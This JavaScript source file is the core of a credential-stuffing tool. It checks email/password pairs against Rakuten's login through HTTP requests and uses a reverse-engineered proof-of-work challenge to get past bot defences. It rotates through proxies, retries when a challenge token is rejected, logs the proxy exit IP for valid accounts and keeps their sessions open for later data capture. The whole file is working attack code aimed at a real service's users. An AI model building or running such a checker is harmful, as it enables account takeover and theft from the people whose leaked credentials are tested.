/**
 * =============================================================================
 * HTTP CHECKER - HTTP-BASED RAKUTEN CREDENTIAL CHECKER
 * =============================================================================
 * 
 * Pure HTTP implementation of Rakuten credential checker.
 * Uses reverse-engineered cres POW algorithm for authentication.
 * 
 * =============================================================================
 */

const { createSession, touchSession, closeSession } = require('./automation/http/sessionManager');
const { navigateToLogin, submitEmailStep, submitPasswordStep } = require('./automation/http/httpFlow');
const { detectOutcome } = require('./automation/http/htmlAnalyzer');
const { captureAccountData } = require('./automation/http/httpDataCapture');
const { fetchIpInfo } = require('./automation/http/ipFetcher');
const { createLogger } = require('./logger');
const { MIN_USERNAME_LENGTH } = require('./automation/batch/parse');

const log = createLogger('http-checker');

/**
 * Completes session alignment to establish cookies on www.rakuten.co.jp
 * @param {Object} session - HTTP session
 * @param {Object} outcome - Login outcome with needsSessionAlign and alignToken
 * @param {number} timeoutMs - Request timeout
 */
async function completeSessionAlignment(session, outcome, timeoutMs) {
  if (!outcome.needsSessionAlign || !outcome.alignToken) {
    return;
  }
  
  const client = session.directClient || session.client;
  
  try {
    log.debug('Completing session alignment');
    
    // POST to sessionAlign endpoint with align_token
    const alignUrl = outcome.url || 'https://member.id.rakuten.co.jp/rms/nid/sessionAlign';
    const alignResponse = await client.post(alignUrl, {
      align_token: outcome.alignToken,
    }, {
      timeout: timeoutMs,
      maxRedirects: 10,
      headers: {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.account.rakuten.com',
        'Referer': 'https://login.account.rakuten.com/',
      },
    });
    
    log.debug(`Session align response: ${alignResponse.status}`);
    
    // Follow any redirects to www.rakuten.co.jp to establish cookies
    if (alignResponse.status === 200 || alignResponse.status === 302) {
      // Try to get the home page to ensure cookies are set
      await client.get('https://www.rakuten.co.jp/', {
        timeout: timeoutMs,
        headers: {
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      });
      log.debug('Session aligned');
    }
  } catch (error) {
    log.warn('Session alignment failed:', error.message);
  }
}

/**
 * Checks Rakuten credentials using HTTP requests.
 * 
 * @param {string} email - Email/username
 * @param {string} password - Password
 * @param {Object} [options] - Check options
 * @param {string} [options.targetUrl] - Target login URL
 * @param {number} [options.timeoutMs=60000] - Timeout in milliseconds
 * @param {string} [options.proxy] - Proxy URL
 * @param {Function} [options.onProgress] - Progress callback
 * @param {boolean} [options.deferCloseOnValid=false] - Keep session open if valid
 */

const MAX_CHALLENGE_RETRIES = 2;

/**
 * Checks if an email step result indicates a challenge token rejection.
 * This happens when /util/gc doesn't return a token and the generated
 * fallback is rejected with VALIDATION_ERROR on challenge_token.
 */
function isChallengeTokenError(emailResult) {
  if (!emailResult || emailResult.status !== 400) return false;
  const data = emailResult.data;
  if (!data) return false;
  if (data.errorCode === 'VALIDATION_ERROR') {
    const errors = data.errors || [];
    return errors.some(e => e.field === 'challenge_token' || e.field === 'challenge');
  }
  return false;
}

/**
 * Checks Rakuten credentials using HTTP requests.
 * 
 * @param {string} email - Email/username
 * @param {string} password - Password
 * @param {Object} [options] - Check options
 * @param {string} [options.targetUrl] - Target login URL
 * @param {number} [options.timeoutMs=60000] - Timeout in milliseconds
 * @param {string} [options.proxy] - Proxy URL
 * @param {Function} [options.onProgress] - Progress callback
 * @param {boolean} [options.deferCloseOnValid=false] - Keep session open if valid
 * @returns {Promise<Object>} Result object with status, message, session
 */
async function checkCredentials(email, password, options = {}) {
  const {
    targetUrl = process.env.TARGET_LOGIN_URL,
    timeoutMs = 60000,
    proxy = null,
    onProgress = null,
    deferCloseOnValid = false,
    batchMode = false,
  } = options;

  if (!targetUrl) {
    throw new Error('Target login URL is required');
  }

  // Validate username length before making any requests
  if (email.length < MIN_USERNAME_LENGTH) {
    log.debug(`Username too short: ${email.length} chars (min: ${MIN_USERNAME_LENGTH})`);
    return {
      status: 'INVALID',
      message: `Username too short (min ${MIN_USERNAME_LENGTH} characters)`,
    };
  }

  let lastResult = null;

  for (let attempt = 0; attempt <= MAX_CHALLENGE_RETRIES; attempt++) {
    let session = null;
    let preserveSession = false;

    try {
      if (attempt > 0) {
        log.info(`[retry] Challenge token retry ${attempt}/${MAX_CHALLENGE_RETRIES}`);
      }

      log.debug('Starting credential check');
      onProgress && (await onProgress('launch'));
      
      // Create HTTP session
      session = createSession({
        proxy,
        timeout: timeoutMs,
        batchMode,
      });

      onProgress && (await onProgress('navigate'));
      const navigationResult = await navigateToLogin(session, targetUrl, timeoutMs);

      onProgress && (await onProgress('email'));
      const emailResult = await submitEmailStep(
        session,
        email,
        navigationResult,
        timeoutMs
      );

      // Detect challenge token rejection — retry with a fresh session
      if (isChallengeTokenError(emailResult) && attempt < MAX_CHALLENGE_RETRIES) {
        log.warn(`[retry] Challenge token rejected (VALIDATION_ERROR), will retry with fresh session (${attempt + 1}/${MAX_CHALLENGE_RETRIES})`);
        closeSession(session);
        session = null;
        continue;
      }

      onProgress && (await onProgress('password'));
      const passwordResult = await submitPasswordStep(
        session,
        password,
        emailResult,
        email,
        timeoutMs
      );

      onProgress && (await onProgress('analyze'));
      const outcome = detectOutcome(passwordResult, passwordResult.finalUrl);

      // Complete session alignment if needed (establishes cookies on www.rakuten.co.jp)
      if (outcome.status === 'VALID' && outcome.needsSessionAlign) {
        await completeSessionAlignment(session, outcome, timeoutMs);
      }

      // Fetch exit IP for VALID credentials if proxy is configured
      // Use proxiedClient to get the actual proxy exit IP (same IP used for password submission)
      if (outcome.status === 'VALID' && proxy) {
        try {
          log.info('[ip-detect] Starting IP detection via proxy');
          onProgress && (await onProgress('ip'));
          const ipClient = session.proxiedClient || session.client;
          const ipInfo = await fetchIpInfo(ipClient, timeoutMs);
          if (ipInfo.ip) {
            outcome.ipAddress = ipInfo.ip;
            log.info(`[ip-detect] Proxy exit IP: ${ipInfo.ip}`);
          } else {
            log.warn(`[ip-detect] Failed to fetch IP: ${ipInfo.error}`);
          }
        } catch (ipError) {
          log.warn(`[ip-detect] IP fetch error: ${ipError.message}`);
        }
      } else if (outcome.status === 'VALID' && !proxy) {
        log.debug('[ip-detect] Skipped (no proxy configured)');
      }

      preserveSession = deferCloseOnValid && outcome.status === 'VALID';
      
      return {
        ...outcome,
        session: preserveSession ? session : undefined,
      };
    } catch (error) {
      log.error('Credential check error:', error.message);
      lastResult = {
        status: 'ERROR',
        message: error.message,
      };
    } finally {
      if (!preserveSession && session) {
        closeSession(session);
      }
    }
  }

  return lastResult || { status: 'ERROR', message: 'Challenge token validation failed after retries' };
}

module.exports = { checkCredentials };
